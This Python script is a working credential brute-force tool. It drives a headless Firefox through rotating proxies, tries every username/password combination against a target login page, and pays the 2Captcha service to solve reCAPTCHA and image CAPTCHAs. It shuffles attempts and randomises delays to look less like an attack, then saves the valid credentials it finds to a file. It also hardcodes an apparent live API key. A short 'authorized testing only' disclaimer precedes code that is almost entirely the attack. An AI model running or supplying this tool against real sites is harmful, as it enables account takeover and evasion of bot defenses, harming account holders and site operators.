#!/usr/bin/env python3
"""
Only use on systems you own or have explicit permission to test.
"""

import os
import logging
import requests
import argparse
import random
import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.firefox.service import Service
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import NoSuchElementException, TimeoutException, WebDriverException

# WARNING: Replace with your own 2Captcha API key
API_KEY = "b2d8853363a604425b32d2ee3030d193"

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('login_audit.log'),
        logging.StreamHandler()
    ]
)

driver_path = "/usr/local/bin/geckodriver"
service = Service(driver_path)

options = Options()
options.add_argument('--headless')
options.add_argument('--no-sandbox')
options.add_argument('--disable-dev-shm-usage')

user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"

class LoginFailedException(Exception):
    pass

def load_proxies(file_path):
    """Load proxies from file, supporting host:port and user:pass@host:port formats"""
    if not os.path.exists(file_path):
        logging.error(f"Proxy file '{file_path}' not found.")
        return []
    
    with open(file_path, 'r') as file:
        proxies = [line.strip() for line in file if line.strip()]
    
    logging.info(f"Loaded {len(proxies)} proxies from {file_path}")
    return proxies

def get_driver_with_proxy(proxy):
    """Create a WebDriver instance with proxy configuration"""
    profile = webdriver.FirefoxProfile()
    profile.set_preference("general.useragent.override", user_agent)
    profile.set_preference("network.proxy.type", 1)
    
    # Handle proxy authentication if present
    if "@" in proxy:
        # Format: user:pass@host:port
        auth, hostport = proxy.split('@')
        user, passw = auth.split(':')
        host, port = hostport.split(':')
        profile.set_preference("network.proxy.http", host)
        profile.set_preference("network.proxy.http_port", int(port))
        profile.set_preference("network.proxy.ssl", host)
        profile.set_preference("network.proxy.ssl_port", int(port))
        # Note: Auto-auth may require additional extensions
    else:
        # Format: host:port
        host, port = proxy.split(':')
        profile.set_preference("network.proxy.http", host)
        profile.set_preference("network.proxy.http_port", int(port))
        profile.set_preference("network.proxy.ssl", host)
        profile.set_preference("network.proxy.ssl_port", int(port))
    
    profile.update_preferences()
    
    try:
        driver = webdriver.Firefox(service=service, options=options, firefox_profile=profile)
        driver.set_page_load_timeout(30)
        return driver
    except Exception as e:
        logging.error(f"Failed to create driver with proxy {proxy}: {e}")
        return None

def find_login_fields(driver):
    """Finds the login form and returns the username and password fields."""
    # Strategy 1: Find the form first, then look for inputs inside it.
    form_selectors = [
        "form[action*='login']",
        "form[id*='login']",
        "form[class*='login']",
        "form"
    ]
    
    form = None
    for selector in form_selectors:
        try:
            form = driver.find_element(By.CSS_SELECTOR, selector)
            logging.info(f"Found form with selector: {selector}")
            break
        except NoSuchElementException:
            continue

    username_field = None
    password_field = None

    if form:
        # Look for inputs within the form
        try:
            username_field = form.find_element(By.CSS_SELECTOR, 
                "input[type='email'], input[type='text'], input[name*='user'], input[name*='mail']")
            password_field = form.find_element(By.CSS_SELECTOR, "input[type='password']")
            return username_field, password_field
        except NoSuchElementException:
            logging.warning("Could not find fields within form, searching whole page")
            pass

    # Strategy 2: If form not found or inputs not in form, search the whole page.
    username_selectors = [
        "input[type='email']",
        "input[type='text'][name*='user']",
        "input[type='text'][name*='mail']",
        "input[name='username']",
        "input[name='email']",
        "input#username",
        "input#email"
    ]
    
    for selector in username_selectors:
        try:
            username_field = driver.find_element(By.CSS_SELECTOR, selector)
            break
        except NoSuchElementException:
            continue

    if username_field is None:
        try:
            username_field = driver.find_element(By.CSS_SELECTOR, "input[type='text']")
        except NoSuchElementException:
            logging.error("Could not find the username field.")

    password_selectors = [
        "input[type='password']",
        "input[name='password']",
        "input[name='pass']",
        "input#password"
    ]
    
    for selector in password_selectors:
        try:
            password_field = driver.find_element(By.CSS_SELECTOR, selector)
            break
        except NoSuchElementException:
            continue

    if password_field is None:
        logging.error("Could not find the password field.")

    return username_field, password_field

def solve_captcha_if_present(driver):
    """
    Checks for common CAPTCHA types and solves them if present.
    Returns the solution if solved, otherwise None.
    """
    captcha_answer = None
    
    # 1. Check for reCAPTCHA v2 by sitekey
    try:
        sitekey = driver.find_element(By.CSS_SELECTOR, '[data-sitekey]').get_attribute('data-sitekey')
        logging.info(f"Found reCAPTCHA v2 with sitekey: {sitekey}")

        response = requests.post(
            "http://2captcha.com/in.php",
            data={
                'key': API_KEY,
                'method': 'userrecaptcha',
                'googlekey': sitekey,
                'pageurl': driver.current_url,
                'json': 1
            },
            timeout=30
        )
        
        response_data = response.json()
        if response_data.get('status') == 1:
            captcha_id = response_data['request']
            logging.info(f"reCAPTCHA sent to 2Captcha, ID: {captcha_id}")

            # Wait for solution
            for _ in range(24):  # Wait up to 2 minutes (5*24=120s)
                time.sleep(5)
                solution_resp = requests.get(
                    f"http://2captcha.com/res.php?key={API_KEY}&action=get&id={captcha_id}&json=1",
                    timeout=30
                )
                solution_data = solution_resp.json()
                if solution_data.get('status') == 1:
                    captcha_answer = solution_data['request']
                    logging.info("reCAPTCHA solved successfully")
                    break
                elif solution_data.get('request') != 'CAPCHA_NOT_READY':
                    logging.error(f"2Captcha error: {solution_data.get('request')}")
                    break
        else:
            logging.error(f"Failed to send reCAPTCHA to 2Captcha: {response_data.get('request')}")
            
    except NoSuchElementException:
        # 2. Fall back to image CAPTCHA
        try:
            captcha_image = driver.find_element(By.CSS_SELECTOR, 
                'img[src*="captcha"], img[src*="CAPTCHA"]')
            captcha_url = captcha_image.get_attribute('src')
            logging.info("Found image CAPTCHA")

            response = requests.post(
                "http://2captcha.com/in.php",
                data={
                    'key': API_KEY,
                    'method': 'base64',
                    'body': captcha_url,
                    'json': 1
                },
                timeout=30
            )

            response_data = response.json()
            if response_data.get('status') == 1:
                captcha_id = response_data['request']
                logging.info(f"Image CAPTCHA sent to 2Captcha, ID: {captcha_id}")
                
                for _ in range(24):
                    time.sleep(5)
                    solution_resp = requests.get(
                        f"http://2captcha.com/res.php?key={API_KEY}&action=get&id={captcha_id}&json=1",
                        timeout=30
                    )
                    solution_data = solution_resp.json()
                    if solution_data.get('status') == 1:
                        captcha_answer = solution_data['request']
                        break
                    elif solution_data.get('request') != 'CAPCHA_NOT_READY':
                        logging.error(f"2Captcha error: {solution_data.get('request')}")
                        break
            else:
                logging.error(f"Failed to send image CAPTCHA: {response_data.get('request')}")
                
        except NoSuchElementException:
            logging.info("No CAPTCHA detected on page.")
    
    except Exception as e:
        logging.error(f"Error in CAPTCHA solving: {e}")
    
    return captcha_answer

def check_login_success(driver, original_url):
    """
    Checks for common indicators of a successful login.
    Returns True if login seems successful, False otherwise.
    """
    time.sleep(3)  # Brief pause to let the page settle

    current_url = driver.current_url
    
    # 1. URL changed (e.g., redirected to /dashboard, /account, /home)
    if current_url != original_url:
        logging.info(f"URL changed from {original_url} to {current_url}. Potential success.")
        return True

    # 2. Presence of logout button (a very strong indicator)
    logout_indicators = ["logout", "log out", "signout", "sign out", "logoff"]
    for indicator in logout_indicators:
        try:
            if driver.find_elements(By.XPATH, 
                f"//*[contains(translate(text(), 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), '{indicator}')]"):
                logging.info(f"Found logout button/link. Login successful.")
                return True
        except:
            continue

    # 3. Presence of welcome message or user-specific content
    welcome_indicators = ["welcome", "my account", "dashboard", "profile", "settings"]
    try:
        page_text = driver.find_element(By.TAG_NAME, "body").text.lower()
        if any(indicator in page_text for indicator in welcome_indicators):
            logging.info("Found welcome text. Login successful.")
            return True
    except:
        pass

    # 4. Check for error messages (if still on login page)
    error_indicators = ["invalid", "error", "incorrect", "failed"]
    try:
        page_text = driver.find_element(By.TAG_NAME, "body").text.lower()
        if any(indicator in page_text for indicator in error_indicators):
            return False
    except:
        pass

    return False

def attempt_login_with_driver(driver, url, username, password):
    """Attempt login using the provided driver instance"""
    try:
        # Clear cookies and refresh to ensure clean state
        driver.delete_all_cookies()
        driver.get(url)
        time.sleep(2)

        username_field, password_field = find_login_fields(driver)
        if not username_field or not password_field:
            logging.error(f"Could not find login fields for {username}. Skipping.")
            return False

        # Fill credentials
        username_field.clear()
        username_field.send_keys(username)
        password_field.clear()
        password_field.send_keys(password)

        # Solve CAPTCHA if present
        captcha_answer = solve_captcha_if_present(driver)
        if captcha_answer:
            try:
                captcha_field = driver.find_element(By.CSS_SELECTOR, 
                    "input[name*='captcha'], input[name*='CAPTCHA']")
                captcha_field.clear()
                captcha_field.send_keys(captcha_answer)
            except NoSuchElementException:
                logging.warning("CAPTCHA solution received but no field found to input it.")

        # Submit form
        password_field.send_keys(Keys.RETURN)
        time.sleep(2)  # Wait for submission

        # Check for success
        success = check_login_success(driver, url)
        if success:
            logging.info(f"SUCCESS! Valid credentials: {username}:{password}")
            # Save successful credentials
            with open("successful_logins.txt", "a") as success_file:
                success_file.write(f"{url} - {username}:{password}\n")
            return True
        else:
            logging.error(f"Login failed for {username}:{password}")
            return False

    except Exception as e:
        logging.error(f"Error during login attempt for {username}: {e}")
        return False

def main():
    parser = argparse.ArgumentParser(description="Brute force login script with proxy support for authorized pentesting.")
    parser.add_argument("url", help="Target URL")
    parser.add_argument("usernames", help="Path to the usernames file")
    parser.add_argument("passwords", help="Path to the passwords file")
    parser.add_argument("--proxy-file", default="proxy.txt", help="Path to proxy file (default: proxy.txt)")
    parser.add_argument("--delay", type=float, default=2.0, help="Delay between attempts in seconds")
    
    args = parser.parse_args()

    # Load resources
    proxies = load_proxies(args.proxy_file)
    if not proxies:
        logging.error("No proxies loaded. Exiting.")
        return

    try:
        with open(args.usernames, 'r') as ufile, open(args.passwords, 'r') as pfile:
            usernames = [line.strip() for line in ufile if line.strip()]
            passwords = [line.strip() for line in pfile if line.strip()]
    except FileNotFoundError as e:
        logging.error(f"File not found: {e}")
        return

    logging.info(f"Loaded {len(usernames)} usernames and {len(passwords)} passwords")

    # Shuffle to appear less like a sequential attack
    random.shuffle(proxies)
    random.shuffle(usernames)
    random.shuffle(passwords)

    successful_logins = 0

    for proxy in proxies:
        logging.info(f"Starting session with proxy: {proxy}")
        driver = get_driver_with_proxy(proxy)
        
        if driver is None:
            logging.error(f"Failed to initialize driver for proxy {proxy}, skipping...")
            continue

        try:
            for username in usernames:
                for password in passwords:
                    logging.info(f"Trying: {username}:{password}")
                    
                    success = attempt_login_with_driver(driver, args.url, username, password)
                    if success:
                        successful_logins += 1
                    
                    # Random delay between attempts
                    delay = random.uniform(args.delay, args.delay * 2)
                    time.sleep(delay)
                    
        except Exception as e:
            logging.error(f"Fatal error in proxy session {proxy}: {e}")
        finally:
            try:
                driver.quit()
            except:
                pass

    logging.info(f"Scan complete. Found {successful_logins} valid credential(s).")

if __name__ == "__main__":
    main()
